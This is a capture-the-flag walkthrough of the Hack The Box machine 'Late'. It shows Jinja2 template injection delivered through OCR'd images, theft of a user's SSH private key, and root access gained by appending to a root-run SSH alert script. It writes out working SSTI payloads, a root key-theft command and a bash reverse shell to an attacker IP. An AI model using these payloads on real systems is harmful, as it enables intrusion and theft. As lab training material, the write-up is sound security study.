## HTB - Late - 10.10.11.156

## Overview

![Descriptive information card about this machine](/assets/img/late_0_infocard.png)

This supposedly 'Easy' difficulty Linux machine Late from https://hackthebox.com was both simple to figure out, and incredibly challenging to pull off.  Patience was a key virtue to have while completing the first challenge.  The way forward was fairly easy to find, but exploiting it took numerous iterations that could not be (easily?) scripted.  I actually gave up on this one twice, but kept coming back since I knew exactly what I needed to do.  In the end, my persistence paid off and I was in.  The second challenge in this machine was both easy to find and easy to miss, depending on how observant you are.  I learned how to use a new tool to gain the information I needed, and the challenge was quickly one.  Overall I liked this machine, except for the pickiness of the initial payload execution.  

## Useful Skills and Tools

### Read attributes of files on Linux with lsattr

`lsattr` lists the file attributes on a second extended file system. See `chattr` below for a description of each attribute.

Useful options:

| Argument | Description                                                                        |
| -------- | ---------------------------------------------------------------------------------- |
| `-R`     | Recursively list attributes of directories and their contents.                     |
| `-a`     | List all files in directories, including files that start with `.` (hidden files). |
| `-d`     | List directories like other files, rather than listing their contents.             |
| `-l`     | Print the options using long names instead of single character abbreviations.      |

You can chain together these options to recursively list the attributes of all files and folders in a directory with long names:

```
lsattr -Ral /home/
```

### Change attributes of files on Linux with chattr

`chattr` changes the file attributes on a Linux file system.

> The format of a symbolic mode is `+-=[aAcCdDeFijmPsStTux]`.

| Symbol | Meaning                                                      |
| ------ | ------------------------------------------------------------ |
| `+`    | Add the following attributes the to specified file           |
| `-`    | Remove the following attributes from the specified file      |
| `=`    | Set the attributes of the specified file to be the following |

The letters `aAcCdDeFijmPsStTux` select the new attributes for the specified files:

| Attribute | Description                        |
| --------- | ---------------------------------- |
| `a`       | append only                        |
| `A`       | no atime updates                   |
| `c`       | compressed                         |
| `C`       | no copy on write                   |
| `d`       | no dump                            |
| `D`       | synchronous directory updates      |
| `e`       | extent format                      |
| `F`       | case-insensitive directory lookups |
| `i`       | immutable                          |
| `j`       | data journaling                    |
| `m`       | don't compress                     |
| `P`       | project hierarchy                  |
| `s`       | secure deletion                    |
| `S`       | synchronous updates                |
| `t`       | tail-merging                       |
| `T`       | top of directory hierarchy         |
| `u`       | undeletable                        |
| `x`       | direct access for files            |

The following attributes are read-only and may be listed by `lsattr` but not modified by `chattr`:

| Attribute | Description       |
| --------- | ----------------- |
| `E`       | encrypted         |
| `I`       | indexed directory |
| `N`       | inline data       |
| `V`       | verity            |

See the [chattr manpage](https://www.man7.org/linux/man-pages/man1/chattr.1.html) for more detailed descriptions of each attribute.

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.156`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |
| `-Pn` | Skips doing a ICMP ping check, useful for hosts that do not reply to these |

The service scan did not reveal much useful other than the version numbers of the services being run.  Neither seemed immediately vulnerable to anything.

### Port 80 - HTTP

Since I had no credentials for SSH I decided to start with enumeration of the HTTP service on port 80.

![There was an HTTP website peddling the Worlds simplest image utilities](/assets/img/late_1_http.png)

```
contact info +234 23 9873237
support@late.htb
234 Hidden Pond Road, Ashland City, TN 37015
```

> Late 2022, Designed by kavigihan with ♥  (http://instagram.com/_kavi.gihan/)

At the bottom of the page I looked for clues that would give me potential information about what the web server was running, or any potential web apps, and I found some contact information including an address and phone number.  Interestingly, the phone number had a strange amount of numbers and did not match the address, which said it was in Tennessee, USA.  I looked up the country code `+234` and found that it is registered to Nigeria.  There was also an email address with the hostname `late.htb` which I added to my hosts file.

![The Contact page showing a second address and phone number](/assets/img/late_2_contact.png)

The 'Contact Us' page had a different address and phone number on it.

```
Address
2002 Holcombe Boulevard, Houston, TX 77030, USA
Phone:
(713) 791-1414
```

The 713 area code on the phone number here actually matched the Houston, Texas address.  There was also a form where a message could be submitted to the site.  I tried a simple XSS test on the form, but after checking for a response in Burp I could see that the data wasn't even being sent to the server.

On the main page of the website under the FAQ section I found a link to `http://images.late.htb/`.

> How can I edit photos online for free?
>
>With [late free online photo editor](http://images.late.htb/), you can do just that. First, open Late's free online photo editor website. Second, choose one editing feature you need, such as basic adjustments, portrait beauty, or photo effects from the left dashboard. Third, apply the feature, download, and share your final piece.

I added `images.late.htb` to `/etc/hosts`, then tried both `late.htb` and the new subdomain to see if the site changed.  `late.htb` simply brought up the main page again, but `images.late.htb` pulled up something new.

## The image converter

![A site with the title Convert image to text with Flask](/assets/img/late_3_convert.png)

I followed the link from the first page, which took me to an online image converter.  This page purported to be able to turn an image into a text document.  If nothing else, the backend (built on Flask, which means Python) seemed like it would be attempting to do optical character recognition (OCR) and parsing text from any images uploaded.  There was an upload button, so of course I tried uploading some different backdoors and python scripts, but nothing seemed to execute.  After a couple of tries I got an error message on the site whenever I tried to upload another file:

![The error message saying no space left on the device](/assets/img/late_6_no_space.png)

> Error occured while processing the image: [Errno 28] No space left on device

No matter what file I uploaded, I received the same error message, so I reverted the machine on Hack the Box.  After this it seemed to work much better.

![After resetting the machine the page layout looked much cleaner](/assets/img/late_3_convert2.png)

After resetting the machine the page layout looked like it was actually loading CSS, and I never got the error message again.

Since my test code examples failed to execute as far as I could tell, I tried uploading an image with a simple bash command payload.  Depending on how the text was being parsed and what it did with it afterwards would determine how to proceed.  

![an image with my basic bash shell command payload](/assets/img/late_4_test_upload.png)

```html
<p>test; cat /etc/passwd
</p>
```

![The results.txt download after each upload](/assets/img/late_7_results.png)

After uploading the image, I got back a file download of `results.txt` ,which contained the text from my image embedded in html `<p>` tags. The site was able to correctly parse the text in the image I sent it, however, it did not look like I could run shell commands directly.  Next I tried to run python code in the same way.

![a simple python payload](/assets/img/late_8_test_upload2.png)

```python
<p>import os;
os.system(‘cat /etc/passwd')|
</p>
```

Unfortunately this did not work either.  I thought at the time that it was perhaps because it incorrectly read my single quote as a backtick.  Next, I tried an old trick of embedding the code directly into the image code using Burp.

![Sending a POST request to the server with a modified png file](/assets/img/late_5_burp_png.png)

I captured the POST request of the file upload, then forwarded it using Burp repeater.  This did not seem to work as intended, but revealed some interesting information instead through an error message.

```
Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/late_9_test_upload31.png6662'
```

The error message recieved after sending my malformed PNG file showed the username and directory of the running web application.  I decided to do some more reading on the backend of this web app and how Flask might be used to power it.

>jinja2
>
>jinja2 is a popular template engine for Python.A web template system combines a template with a specific data source to render a dynamic web page.

>This allows you to pass Python variables into HTML templates like this:

<!-- {% raw %} -->
```javascript
<html>
    <head>
        <title>{{ title }}</title>
    </head>
    <body>
        <h1>Hello {{ username }}</h1>
    </body>
</html>
```
<!-- {% endraw %} -->

I quickly recognized the double curly brace syntax from my recent adventures doing the machine Catch from Hack the Box (see my [writeup here](https://zweilosec.github.io/posts/catch/)!)  In this challenge I had used Server Side Template Injection (SSTI) to get the server to execute code through injection in the code parser.

* https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
* https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

This was plenty of information to start trying to test for SSTI vulnerabilities in Flask using Jinja.  

<!-- {% raw %} -->
I sent a standard payload `{{ 7 * 7 }}` to test for potential code execution.  If the vulnerablitiy existed, the results I got back should contain the result of the math expression, and not just the text.
<!-- {% endraw %} -->

![results.txt showing code execution](/assets/img/late_10_ssti_confirmed.png)

After opening the new `results.txt`, I got back confirmation that there was indeed an SSTI vulnerability.  Now, I just had to test if it could be exploited to run other arbitrary code.  As I found out during the [previous challenge](https://zweilosec.github.io/posts/catch/) sometimes simple math gets through, but filters block anything more advanced.

<!-- {% raw %} -->
Going off the blog posts I found during my research into Jinja SSTI vulnerabilities, I sent the payload `{{ config }} `
<!-- {% endraw %} -->

```javascript
<p>&lt;Config {&#39;ENV&#39;: &#39;production&#39;,
&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False,

&#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None,

&#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, 
&#39;SESSION_COOKIE_DOMAIN&#39;: False,

&#39;SESSION_COOKIE_HTTPONLY&#39;: True, 
&#39;SESSION_COOKIE_SECURE&#39;: False, 
&#39;SESSION_COOKIE_SAMESITE&#39;: None, 
&#39;SESSION_REFRESH_EACH_REQUEST&#39;: True,

&#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;:
4093}&gt;
</p>
```

This executed as well, but unfortunately there did not seem to be anything useful in the output.

### Frustrations with the OCR text parser

After the two simple code execution successes, I decided to go for code execution using the more complicated Python core object method chains in the examples.  This is where I started to run into problems with the optical character recognition software.  

![An error received after uploading a payload with quotes in it](/assets/img/late_11_scan_error.png)

On of the payloads I tried had single quotes in it, which led to an error.  It looked like it read a quote and something broke, which looked promising.  

<!-- {% raw %} -->
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

I sent the above payload based on the request module (which is supposedly included in Jinja/Flask), trying to get the system to run the command `id`.  

```
<p>avi.request.apphlication. gloDdDals.. Duilltins . Import__ (os ).popen(ild ).read) 5 ¢
</p>
```

My `results.txt` contained garbled output.  It looked like I was dealing with limitations of the text scanner.  

![error reading the image saying no globals attribute](/assets/img/late_12_scan_error2.png)
> Error occured while processing the image: 'method object' has no attribute 'globals_'

I tried the same payload with a larger font and got the above error message.  It looked like the code might actually be executing!  I wasn't sure at this point if the `globals` attribute was actually missing or if it had misread the text again.

```python
'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('test.txt').read()
```

I decided to try another payload to see if it could read it better. My next payload used a different chain based on the String class.

```
<p>"abc'. class. base. subclasses ()[96]. subclasses ()[0]. subclasses ()[0]( */etc/passwd|' ).read()

</p>
```

After getting back `results.txt` I started thinking that this scanner was not so great!  It did not seem to recognize underscores at all, which could be a problem since this method of exploitation relied on Python inner workings that had lots of underscores.  I decided to try using variations of themes, fonts, colors, and sizes to see if I could coax the scanner into reading my payload images.

### one day later...

![the payload that almost seemed to work](/assets/img/late_13_test_upload6.png)

After what seemed like a million tries, using the Kate theme and Noto Serif Regular font (size 12), I was able to get the reader to read my text enough to return something a bit different than the garbled output it had been giving up to that point.  

```
<p>subclasses__()[0]("/etc/passwd").read()
</p>
```

Unfortunately the output showed that it was running something...but it stopped reading just before the final part.  It looked like maybe a random space was inserted.  Spaces and underscores were the worst to deal with.

### another day later...

![a version of the requests payload that almost worked](/assets/img/late_16_test_payload.png)

I sent many variations of the different payloads; each one getting back slightly different errors, output, or garbled text.  This payload gave me an error that seemed very promising.

![An error message saying there was no such module](/assets/img/late_17_so_close.png)

This error message was a bit discouraging until I noticed one tiny thing in the output: there was a space before `os`.  It seemed like the parser had put an extra space before the module name, which caused Python to throw an error. Re-energized, I tried different variations in the text to try to get it to read the module name correctly. 

<!-- {% endraw %} -->

### A working payload

![the working payload](/assets/img/late_18_final_payload.png)

I tried a lot of variations in spacing and quotes once I got a font that seemed to be readable enough to get code execution.

```
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```

Using the above payload I finally got back a response with shell command code execution !!!!!! The output verified the information I had gotten from a previous error message and showed the web app was running as the user `svc_acc`.  I was very elated at this time, and tried to run other commands using this as a template.

<!-- {% raw %} -->
```plaintext
   {{ request.application._ _ globals_ _ . _ _builtins_ _ . _ _import_ _( "os" ).popen( "id" ).read() }}
```
<!-- {% endraw %} -->

The payload that finally worked was as above (note the odd spaces).  I had to format it like this with the Noto Serif Regular Font (size 12) on the Kali-Dark theme.  It took me hundreds of iterations with different fonts, themes, spacing, quotes, etc to get this to finally work.  

![the settings I used to get a working payload](/assets/img/late_18_settings.png)

### /etc/passwd

![the payload that let me get etc password](/assets/img/late_19_passwd.png)

It took me another 5 tries of adjusting spaces to get the payload to work with my next command `cat /etc/passwd`.

I was excited to finally get this to work after a few days of trying, but now I was tired of playing with the OCR and wanted to be done.  Since I already had the username of the service was running under, I hoped that it would allow me to quickly gain a foothold on this machine with a minimum of commands sent, and with the least special characters used.

```
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
```

Inexplicably this service account could log in with a shell, so I hoped they would also have an SSH key I could steal.  If not, I would add my key to an `authorized_keys` file, creating it if I had to.  I had the path to the user's home directory already, so I crafted my next payload to target the SSH key.

### id_rsa

![The payload used to get the ssh key](/assets/img/late_20_idRsa.png)

I had to play with spacing a bit again to get the next command to work, but it was not near as much trouble now that I could get the OCR to (somewhat) consistently read the payloads I sent.  

![The SSH key for the service account](/assets/img/late_21_rsa_key.png)

It was an extreme relief to see that my hunch was right, and that the default SSH key name had been used.  I copied the SSH private key to another file and used it to log in as `svc_acc`.

## Initial Foothold

```
┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ ssh svc_acc@10.10.11.156 -i late.key
svc_acc@late:~$ id && hostname
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
late
```

Finally, after a couple days of struggling with getting the OCR to read my payloads correctly, I had a solid foothold on the machine, and longer had to rely on inconsistent methods of code execution.

    if request.method == 'POST':
        start_time = datetime.datetime.now()
        f = request.files['file']

        if f.filename.split('.')[-1] in allowed_extensions:
            try:
                ID = str(random.randint(1,10000))
                file_name = upload_dir + "/" + secure_filename(f.filename )+ ID

                scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))

                results = """<p>{}</p>""".format(scanned_text)

                r = render_template_string(results)
                path = misc_dir + "/" + ID + '_' + 'results.txt'

                with open(path, 'w') as f:
                    f.write(r)

                return send_file(path, as_attachment=True,attachment_filename='results.txt')

            except Exception as e:
                return ('Error occured while processing the image: ' + str(e))
	    else:
         return 'Invalid Extension'
```

I began my enumeration of the machine by checking out the code for the web app.  The file `main.py` was the code for backend of the image processing site and contained a secret key `b'_5#y2L"F4Q8z\n\xec]/'`.  I realized that this was pretty much the same as the secret key that I had leaked during one of my first code execution tests, but there seemed to be some character encoding in that one that made it hard to recognize. 

```

```

Next, I checked running processes; There seemed to be mail being sent which looked to potentially be an alert after I had used SSH to log in.

```bash
#!/bin/bash
  
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

```

It was indeed what the script `/usr/local/sbin/ssh-alert.sh` seemed to be for.  It would send an email to the user specified (`root` in the case of the running process I saw).  I thought earlier that it was odd that this user would have SSH login enabled.  It seemed like it was being monitored.  It also looked like code could be run in the body of this email...I wondered if I could get the root user to execute commands for me by triggering an alert?

```
svc_acc@late:/dev/shm$ ls -la /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Jul 24 20:34 /usr/local/sbin/ssh-alert.sh
```

It did not appear as if I could write to this file, but when I opened it in vim earlier I did not get a read-only error as normal for files that you do not have write permissions for.

```
"/usr/local/sbin/ssh-alert.sh"                                                          
WARNING: The file has been changed since reading it!!!
Do you really want to write to it (y/n)?y
"/usr/local/sbin/ssh-alert.sh" E212: Can't open file for writing
Press ENTER or type command to continue

```

I tried to save some changes to the file and got the error `E212: Can't open file for writing`.  So the file was not writeable, but also was not read-only?  This was strange behavior.

* https://knowledge.informatica.com/s/article/521629?language=en_US

I did some research on this error message and found a knowledge center post which seemed to show a similar situation.  It described using the command `lsattr` to check the file's attributes to see if it had been marked as non-editable.

* https://howtoforge.com/linux-lsattr-command/
  
>The  letters 'aAcCdDeijPsStTu' select the new attributes for the files:

```
svc_acc@late:/dev/shm$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

I checked the attributes of the file with `lsattr` and found that I was only able to append (`a`) the document, not directly write to it.  This was why I was unable to save the file after editing it, but vim did not show the file as 'read-only'.  

```shell
svc_acc@late:/dev/shm$ echo '`echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDEkT7JxMDRMObKtE7+GuvBQGPHPnDmF7Yly0ZClqrdC > /root/.ssh/authorized_keys`' >> /usr/local/sbin/ssh-alert.sh
```

Armed with knowledge, I decided to try to add my SSH public key to `root`'s `authorized_keys` file.  I logged out of my SSH session and then back in to try to trigger the alert script again.  After verifying that the script ran, I tried to SSH in as `root`. This did not work.

```shell
svc_acc@late:~$ echo '`cat /root/.ssh/id_rsa > /dev/shm/.test`' >> /usr/local/sbin/ssh-alert.sh

```

Next, I tried to send `root`'s potential SSH key to another file, but nothing appeared after forcing the script ro run again.

```bash
# Authentication:

#LoginGraceTime 2m
PermitRootLogin no
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10
```

I found the problem in the file `/etc/ssh/sshd_config`: root was not allowed to login through SSH.

### Getting a shell

```shell
svc_acc@late:/dev/shm$ echo '`bash -c "bash -i >& /dev/tcp/10.10.14.132/9001 0>&1"`' >> /usr/local/sbin/ssh-alert.sh
```

Next, I tried to get in directly by sending myself a reverse shell.

Shortly afterwards, I was greeted by a shell on my waiting netcat listener, and was able to collect the root proof.  Job complete!

Thanks to [`kavlglhan`](https://app.hackthebox.com/users/389926) for teaching me patience as a hacker.  This machine required what seemed to be hundreds of iterations of testing different fonts, styles, colors, and sizes of the text to get the OCR to properly read every single character in my SSTI payload.  It especially had difficulty with underscores and spacing between characters.  Other than frustrations with the OCR, the machine was fairly simple and straightforward.  I enjoyed learning about Jinja and SSTI, as well as the `lsattr` tool, which was new to me.  These will certainly come in handy in the future.
